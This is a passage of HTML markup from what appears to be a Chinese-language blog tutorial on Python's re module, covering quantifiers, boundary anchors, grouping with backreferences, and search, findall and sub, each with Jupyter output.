class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">r"c:\a"</span>,mm).group()</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure><pre><code>打印：---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-45-1a051863b698&gt; in &lt;module&gt;----&gt; 1 ret = re.match(r&quot;c:\a&quot;,mm).group()      2 print(ret)AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="4-2-示例说明"><a href="#4-2-示例说明" class="headerlink" title="4.2 示例说明"></a>4.2 示例说明</h3><p>Python字符串前面加上<strong>r</strong> 表示原生字符串</p><p>与大多数编程语言相同，正则表达式里使用”\n”作为转义字符，这就可能造成反斜杠困扰。加入匹配文本中的字符串”\“，那么使用编程语言表示的正则表达式里将需要4个反斜杠“\\”：前两个和后两个分别用于在编程语言里转义反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠</p><p>Python里的原生字符串很好的解决了这个问题，不再担心漏写反斜杠，写出的表达式更直观</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mm= <span class="string">"c:\\a\\b\\c"</span></span><br><span class="line">ret = re.match(<span class="string">r"c:\\a"</span>,mm).group()</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure><pre><code>打印：c:\a</code></pre><h2 id="0x05-表示数量"><a href="#0x05-表示数量" class="headerlink" title="0x05 表示数量"></a>0x05 表示数量</h2><p>匹配多个字符的相关格式</p><table><thead><tr><th align="center">字符</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">*</td><td align="left">匹配前一个字符出现0次或者无限次，即可有可无</td></tr><tr><td align="center">+</td><td align="left">匹配前一个字符出现1次或者无限次，即至少有1次</td></tr><tr><td align="center">?</td><td align="left">匹配前一个字符出现1次或者0次, 即要么有1次，要么没有</td></tr><tr><td align="center">{m}</td><td align="left">匹配前一个字符出现m次</td></tr><tr><td align="center">{m,}</td><td align="left">匹配前一个字符至少出现m次</td></tr><tr><td align="center">{m,n}</td><td align="left">匹配前一个字符出现从m到n次</td></tr></tbody></table><h3 id="5-1-示例1："><a href="#5-1-示例1：" class="headerlink" title="5.1 示例1：*"></a>5.1 示例1：*</h3><p>需求：匹配出，一个字符串第一个字母为大写字符，后面都是小写字母并且这些小写字母可有可无</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ret = re.match(<span class="string">"[A-Z][a-z]*"</span>,<span class="string">"Mm"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;Mm&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># *前无匹配字符时是可以的</span></span><br><span class="line">ret = re.match(<span class="string">"[A-Z][a-z]*"</span>,<span class="string">"M"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;M&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># *前字符的匹配有连续多个</span></span><br><span class="line">ret = re.match(<span class="string">"[A-Z][a-z]*"</span>,<span class="string">"Mabcdef"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;Mabcdef&apos;</code></pre><h3 id="5-2-示例2："><a href="#5-2-示例2：" class="headerlink" title="5.2 示例2：+"></a>5.2 示例2：+</h3><p>需求：匹配出，变量名是否有效</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [a-zA-Z]+表示与[a-zA-Z]至少匹配成功一个字母，[\w]* 表示*前字符可有0个或多个</span></span><br><span class="line">ret = re.match(<span class="string">"[a-zA-Z]+[\w]*"</span>,<span class="string">"name1"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;name1&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"[a-zA-Z_]+[\w]*"</span>,<span class="string">"_name"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;_name&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"[a-zA-Z_]+[\w]*"</span>,<span class="string">"2_name"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>打印:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-65-572ee7f143b4&gt; in &lt;module&gt;      1 ret = re.match(&quot;[a-zA-Z_]+[\w]*&quot;,&quot;2_name&quot;)----&gt; 2 ret.group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="5-3-示例3：？"><a href="#5-3-示例3：？" class="headerlink" title="5.3 示例3：？"></a>5.3 示例3：？</h3><p>需求：匹配出，0-99之间的数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"[1-9]?[0-9]"</span>,<span class="string">"7"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;7&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"[1-9]?[0-9]"</span>,<span class="string">"33"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;33&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 结果原因：第一个数字[1-9]未匹配到，？出现0次或1次；所以后一个[0-9]匹配了0</span></span><br><span class="line">ret =re.match(<span class="string">"[1-9]?[0-9]"</span>,<span class="string">"09"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;0&apos;</code></pre><h3 id="5-4-示例4：-m"><a href="#5-4-示例4：-m" class="headerlink" title="5.4 示例4：{m}"></a>5.4 示例4：{m}</h3><p>需求：匹配出，8-20位的密码，可以大小写英文字母、数字、下划线</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ret =re.match(<span class="string">"[a-zA-Z0-9_]&#123;6&#125;"</span>,<span class="string">"12a3g45678"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;12a3g4&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"[a-zA-Z0-9_]&#123;8,20&#125;"</span>,<span class="string">"1ad12fffs39d739473920_d398sd"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;1ad12fffs39d73947392&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [\w]==[a-zA-Z0-9_]，当然其他也有各自的等价表示方法</span></span><br><span class="line">ret = re.match(<span class="string">"[\w]&#123;8,20&#125;"</span>,<span class="string">"1ad12fffs39d739473920_d398sd"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;1ad12fffs39d73947392&apos;</code></pre><ul><li>简单练习，匹配出163的邮箱地址，且@符号之前有4-20位，例如<code>hello@163.com</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 简单练习，匹配163邮箱地址(不完善)</span></span><br><span class="line">ret =re.match(<span class="string">"[\w]&#123;4,20&#125;@163\.com"</span>,<span class="string">"hell0@163.com"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;hell0@163.com&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 思考如何匹配以。。。结尾</span></span><br><span class="line">ret = re.match(<span class="string">"[\w]&#123;4,20&#125;@163\.com"</span>,<span class="string">"hello@163.comddddd"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;hello@163.com&apos;</code></pre><h2 id="0x06-表示边界"><a href="#0x06-表示边界" class="headerlink" title="0x06 表示边界"></a>0x06 表示边界</h2><table><thead><tr><th align="left">字符</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">匹配字符串开头</td></tr><tr><td align="left">$</td><td align="left">匹配字符串结尾</td></tr><tr><td align="left">\b</td><td align="left">匹配一个单词的边界</td></tr><tr><td align="left">\B</td><td align="left">匹配非单词边界</td></tr></tbody></table><h3 id="6-1-示例1："><a href="#6-1-示例1：" class="headerlink" title="6.1 示例1：$"></a>6.1 示例1：$</h3><p>需求：匹配163.com的邮箱地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确的地址</span></span><br><span class="line">ret = re.match(<span class="string">"[\w]&#123;4,20&#125;@163\.com"</span>,<span class="string">"xiaoWang@163.com"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;xiaoWang@163.com&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不正确的地址</span></span><br><span class="line">ret = re.match(<span class="string">"[\w]&#123;4,20&#125;@163\.com"</span>,<span class="string">"xiaoWang@163.comheihhh"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;xiaowang@163.com&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过$来确定末尾,从而过滤不正确地址</span></span><br><span class="line">ret = re.match(<span class="string">"[\w]&#123;4,20&#125;@163\.com$"</span>,<span class="string">"xiaoWang@163.comheihhh"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>打印：---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-93-83efc35bff7d&gt; in &lt;module&gt;      1 # 通过$来确定末尾      2 ret = re.match(&quot;[\w]{4,20}@163\.com$&quot;,&quot;xiaoWang@163.comheihhh&quot;)----&gt; 3 ret.group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="6-2-示例2：-b"><a href="#6-2-示例2：-b" class="headerlink" title="6.2 示例2：\b"></a>6.2 示例2：\b</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r".*\bver\b"</span>,<span class="string">"ho ver abc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;ho ver&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当单词右边没有边界时，使用\b出错</span></span><br><span class="line">re.match(<span class="string">r".*\bver\b"</span>,<span class="string">"ho verabc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-95-d65bbce81439&gt; in &lt;module&gt;----&gt; 1 re.match(r&quot;.*\bver\b&quot;,&quot;ho verabc&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当指定单词左边无边界时，也出错</span></span><br><span class="line">re.match(<span class="string">r".*\bver\b"</span>,<span class="string">"hover abc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-96-53f69a15373e&gt; in &lt;module&gt;----&gt; 1 re.match(r&quot;.*\bver\b&quot;,&quot;hover abc&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="6-3-示例3：-B"><a href="#6-3-示例3：-B" class="headerlink" title="6.3 示例3：\B"></a>6.3 示例3：\B</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r".*\Bver\B"</span>,<span class="string">"hoverabc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;hover&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当指定词有左边界时，出错</span></span><br><span class="line">re.match(<span class="string">r".*\Bver\B"</span>,<span class="string">"ho verabc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-98-a9d342249fa1&gt; in &lt;module&gt;      1 # 当指定词有左边界时，出错----&gt; 2 re.match(r&quot;.*\Bver\B&quot;,&quot;ho verabc&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当指定的词，有右边界时，\B出错</span></span><br><span class="line">re.match(<span class="string">r".*\Bver\B"</span>,<span class="string">"hover abc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-99-aae06b891466&gt; in &lt;module&gt;----&gt; 1 re.match(r&quot;.*\Bver\B&quot;,&quot;hover abc&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当指定的词，左右都有边界时，\B出错</span></span><br><span class="line">re.match(<span class="string">r".*\Bver\B"</span>,<span class="string">"ho ver abc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-101-9630adaf466f&gt; in &lt;module&gt;      1 # 当指定的词，左右都有边界时，\B出错----&gt; 2 re.match(r&quot;.*\Bver\B&quot;,&quot;ho ver abc&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h2 id="0x07-匹配分组"><a href="#0x07-匹配分组" class="headerlink" title="0x07 匹配分组"></a>0x07 匹配分组</h2><table><thead><tr><th align="center">字符</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center"></td><td align="left"></td></tr><tr><td align="center">(ab)</td><td align="left">将括号中字符作为一个分组</td></tr><tr><td align="center">\num</td><td align="left">引用分组num匹配到的字符串</td></tr><tr><td align="center">(?P<code>&lt;name&gt;</code>)</td><td align="left">分组起别名</td></tr><tr><td align="center">(?P=name)</td><td align="left">引用别名为name分组匹配到的字符串</td></tr></tbody></table><h3 id="7-1-示例1："><a href="#7-1-示例1：" class="headerlink" title="7.1 示例1：|"></a>7.1 示例1：|</h3><p>需求：匹配出0-100之间的数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ret = re.match(<span class="string">"[1-9]?\d"</span>,<span class="string">"8"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;8&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">"[1-9]?\d"</span>,<span class="string">"78"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;78&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不确定的情况下</span></span><br><span class="line">re.match(<span class="string">"[1-9]?\d"</span>,<span class="string">"08"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;0&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修正之后的</span></span><br><span class="line">re.match(<span class="string">"[1-9]?\d$"</span>,<span class="string">"08"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-106-70c347cddb39&gt; in &lt;module&gt;      1 # 修正之后的----&gt; 2 re.match(&quot;[1-9]?\d$&quot;,&quot;08&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><ul><li>添加 |</li></ul><p>可匹配0到100（包括0和100）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加 |</span></span><br><span class="line">re.match(<span class="string">"[1-9]?\d$|100"</span>,<span class="string">"100"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;100&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">"[1-9]?\d$|100"</span>,<span class="string">"0"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;0&apos;</code></pre><h3 id="7-2-示例2："><a href="#7-2-示例2：" class="headerlink" title="7.2 示例2：()"></a>7.2 示例2：()</h3><p>需求：匹配出163、126、qq邮箱直接的数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">"\w&#123;4,20&#125;@163\.com"</span>,<span class="string">"test@163.com"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;test@163.com&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用 （）分组</span></span><br><span class="line">re.match(<span class="string">"\w&#123;4,20&#125;@(163|126|qq)\.com"</span>,<span class="string">"test@126.com"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;test@126.com&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">"\w&#123;4,20&#125;@(163|126|qq)\.com"</span>,<span class="string">"test@gmail.com"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-111-d286dbf8fcf2&gt; in &lt;module&gt;----&gt; 1 re.match(&quot;\w{4,20}@(163|126|qq)\.com&quot;,&quot;test@gmail.com&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><ul><li>练习：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"([^-]*)-(\d+)"</span>,<span class="string">"010-12345678"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;010-12345678&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret.groups()</span><br></pre></td></tr></table></figure><pre><code>Out:(&apos;010&apos;, &apos;12345678&apos;)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret.group()默认ret.group(0)</span></span><br><span class="line">ret.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;010&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret.group(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;12345678&apos;</code></pre><h3 id="7-3-示例3："><a href="#7-3-示例3：" class="headerlink" title="7.3 示例3：\"></a>7.3 示例3：\</h3><p>需求：匹配出<code>&lt;html&gt;hh&lt;/html&gt;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 能够完成对正确的字符串的匹配</span></span><br><span class="line">re.match(<span class="string">"&lt;[a-zA-Z]*&gt;\w*&lt;/[a-zA-Z]*&gt;"</span>,<span class="string">"&lt;html&gt;hh&lt;/html&gt;"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;&lt;html&gt;hh&lt;/html&gt;&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 遇到非正常的html格式字符串，匹配出错</span></span><br><span class="line">re.match(<span class="string">"&lt;[a-zA-Z]*&gt;\w*&lt;/[a-zA-Z]*&gt;"</span>, <span class="string">"&lt;html&gt;hh&lt;/htmlbalabala&gt;"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;&lt;html&gt;hh&lt;/htmlbalabala&gt;&apos;</code></pre><ul><li>思路：如果在第一对&lt;&gt;中是什么，按理说后面的那对&lt;&gt;中就应该是什么</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过引用分组中匹配到的数据即可,但是要注意是元字符串，即类似r""这种格式</span></span><br><span class="line">re.match(<span class="string">r"&lt;([a-zA-Z]*)&gt;\w*&lt;/\1&gt;"</span>,<span class="string">"&lt;html&gt;hh&lt;/html&gt;"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;&lt;html&gt;hh&lt;/html&gt;&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 因为2对&lt;&gt;中的数据不一致，所以没匹配出来</span></span><br><span class="line">re.match(<span class="string">r"&lt;([a-zA-Z]*)&gt;\w*&lt;/\1&gt;"</span>,<span class="string">"&lt;html&gt;hh&lt;/htmlddd&gt;"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-126-f2f15b62f076&gt; in &lt;module&gt;      1 # 因为2对&lt;&gt;中的数据不一致，所以没匹配出来----&gt; 2 re.match(r&quot;&lt;([a-zA-Z]*)&gt;\w*&lt;/\1&gt;&quot;,&quot;&lt;html&gt;hh&lt;/htmlddd&gt;&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="7-4-number"><a href="#7-4-number" class="headerlink" title="7.4 \number"></a>7.4 \number</h3><p>需求：匹配出<code>&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h1&gt;&lt;/html&gt;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r"&lt;(\w*&gt;)&lt;(\w*)&gt;.*&lt;/\2&gt;&lt;/\1"</span>,<span class="string">"&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h1&gt;&lt;/html&gt;"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h1&gt;&lt;/html&gt;&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r"&lt;(\w*&gt;)&lt;(\w*)&gt;.*&lt;/\2&gt;&lt;/\1"</span>,<span class="string">"&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h2&gt;&lt;/html&gt;"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-128-1cf071943a2d&gt; in &lt;module&gt;----&gt; 1 re.match(r&quot;&lt;(\w*&gt;)&lt;(\w*)&gt;.*&lt;/\2&gt;&lt;/\1&quot;,&quot;&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h2&gt;&lt;/html&gt;&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="7-5-示例5-（-P-lt-name-gt-）-P-name"><a href="#7-5-示例5-（-P-lt-name-gt-）-P-name" class="headerlink" title="7.5 示例5:（?P&lt;name&gt;）(?P=name)"></a>7.5 示例5:<code>（?P&lt;name&gt;）(?P=name)</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">r"&lt;(?P&lt;name1&gt;\w*)&gt;&lt;(?P&lt;name2&gt;\w*)&gt;.*&lt;/(?P=name2)&gt;&lt;/(?P=name1)&gt;"</span>, <span class="string">"&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;&apos;</code></pre><ul><li>注意：<code>(?P&lt;name&gt;)和(?P=name)</code>中的字母p大写</li></ul><h2 id="0x08-re模块的高级用法"><a href="#0x08-re模块的高级用法" class="headerlink" title="0x08 re模块的高级用法"></a>0x08 re模块的高级用法</h2><h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>需求：匹配出文章的阅读次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret =re.search(<span class="string">r"\d+"</span>,<span class="string">"阅读次数为9999"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;9999&apos;</code></pre><h3 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h3><p>需求：统计出python、c、c++相应文章阅读的次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.findall(<span class="string">r"\d+"</span>,<span class="string">"python=9999,c=7890,c++=1234"</span>)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><pre><code>Out:[&apos;9999&apos;, &apos;7890&apos;, &apos;1234&apos;]</code></pre><h3 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h3><blockquote><p>将匹配到的数据进行替换</p></blockquote><p>需求：将匹配到的阅读次数加1</p><ul><li>方法1</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub（要匹配的模式，要替换的内容，被替换的内容）</span></span><br><span class="line">ret =re.sub(<span class="string">r"\d+"</span>,<span class="string">"998"</span>,<span class="string">"python=997"</span>)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><pre><code>OUt:&apos;python=998&apos;</code></pre><ul><li>方法2 </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub可传递函数，将匹配到的内容再以参数形式传给定义的函数</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(temp)</span>:</span></span><br><span class="line">    print(temp)</span><br><span class="line">    strNum = temp.group()</span><br><span class="line">    num =int(strNum) +<span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> str(num)</span><br><span class="line"></span><br><span class="line">ret =re.sub(<span class="string">r"\d+"</span>,add,<span class="string">"python=997"</span>)</span><br><span 